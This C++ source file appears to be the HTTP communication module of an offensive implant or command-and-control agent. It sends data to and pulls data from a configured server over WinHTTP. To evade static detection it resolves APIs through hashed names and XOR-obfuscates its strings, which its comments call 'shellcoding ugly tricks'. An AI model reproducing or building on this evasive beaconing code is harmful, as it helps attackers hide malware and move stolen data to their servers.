#include "http_com.hpp"
#include "api_hashing.hpp"
#include "memory.hpp"


int http_com(int is_get, config_t *config, uint8_t *to_send, size_t to_send_size, uint8_t **to_receive, size_t *to_receive_size) {
  HINTERNET session = NULL, connect = NULL, request = NULL;
  uint32_t bytes_to_read = 0, result, bytes_received = 0; 
  wchar_t *verb = NULL;
  // shellcoding ugly tricks
  XOR_WSTR("POST", post_verb);
  XOR_WSTR("GET", get_verb);

  fnWinHttpOpen fn_win_http_open = (fnWinHttpOpen) get_proc_address(config->winhttp, WINHTTPOPEN);
  fnWinHttpConnect fn_win_http_connect = (fnWinHttpConnect) get_proc_address(config->winhttp, WINHTTPCONNECT);
  fnWinHttpOpenRequest fn_win_http_open_request = (fnWinHttpOpenRequest) get_proc_address(config->winhttp, WINHTTPOPENREQUEST);
  fnWinHttpSendRequest fn_win_http_send_request = (fnWinHttpSendRequest) get_proc_address(config->winhttp, WINHTTPSENDREQUEST);
  fnWinHttpReceiveResponse fn_win_http_receive_response = (fnWinHttpReceiveResponse) get_proc_address(config->winhttp, WINHTTPRECEIVERESPONSE);
  fnWinHttpQueryDataAvailable fn_win_http_query_data_available = (fnWinHttpQueryDataAvailable) get_proc_address(config->winhttp, WINHTTPQUERYDATAAVAILABLE);
  fnWinHttpReadData fn_win_http_read_data = (fnWinHttpReadData) get_proc_address(config->winhttp, WINHTTPREADDATA);
  fnWinHttpCloseHandle fn_win_http_close_handle = (fnWinHttpCloseHandle) get_proc_address(config->winhttp, WINHTTPCLOSEHANDLE);

  session = fn_win_http_open(config->agent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if(session == NULL) {
    ERROR_LOG("WinHttpOpen failed with error code %u", GetLastError());
    result = 1;
    goto session_failed;
  }

  connect = fn_win_http_connect(session, config->server, config->port, 0);
  if(connect == NULL) {
    ERROR_LOG("WinHttpConnect failed with error code %u", GetLastError());
    result = 1;
    goto connect_failed;
  }

  // shellcoding ugly tricks
  if(is_get) {
    verb = get_verb;
  } else {
    verb = post_verb;
  }

  request = fn_win_http_open_request(connect, verb, config->endpoint, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
  if(request == NULL) {
    ERROR_LOG("WinHttpOpenRequest failed with error code %u", GetLastError());
    result = 1;
    goto request_failed;
  }
  result = fn_win_http_send_request(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0, to_send, to_send_size, to_send_size, 0);
  if(!result) {
    ERROR_LOG("WinHttpSendRequest failed with error code %u", GetLastError());
    result = 1;
    goto send_request_failed; 
  }
  result = fn_win_http_receive_response(request, NULL);
  if(!result) {
    ERROR_LOG("WinHttpReceiveResponse failed with error code %u", GetLastError());
    result = 1;
    goto send_request_failed; 
  }
  while(result) {
    result = fn_win_http_query_data_available(request, &bytes_to_read);
    if(!result) {
      ERROR_LOG("WinHttpQueryDataAvailable failed with error code %u", GetLastError());
      result = 1;
      goto send_request_failed;
    }
    if(bytes_to_read == 0) {
      break;
    }
    if(!*to_receive) {
      *to_receive = (uint8_t *)alloc_mem(config, bytes_to_read);
      if(!*to_receive) {
        ERROR_LOG("Not enough memory abort");
        break;
        }
    } else {
      if(!(*to_receive = (uint8_t *)re_alloc_mem(config, *to_receive, *to_receive_size + bytes_to_read))) {
        ERROR_LOG("Not enough memory on realloc abort");
        break;
      }
    }
    DEBUG("%lu bytes will be read", bytes_to_read);
    result = fn_win_http_read_data(request, *to_receive + bytes_received, bytes_to_read, &bytes_received);
    if(!result) {
      ERROR_LOG("WinHttpReadData failed with error code %u", GetLastError());
      result = 1;
      goto send_request_failed;
    }
    *to_receive_size += bytes_received;
  }

  INFO_SUCCESS("Request %ws with success!", config->endpoint);
  // INFO("Request result %s", *to_receive);
  result = 0;

send_request_failed:
    if(request)
        fn_win_http_close_handle(request);

request_failed:
    if(connect)
        fn_win_http_close_handle(connect);
    
connect_failed:
    if(session) 
        fn_win_http_close_handle(session);

session_failed:
   return result; 
}


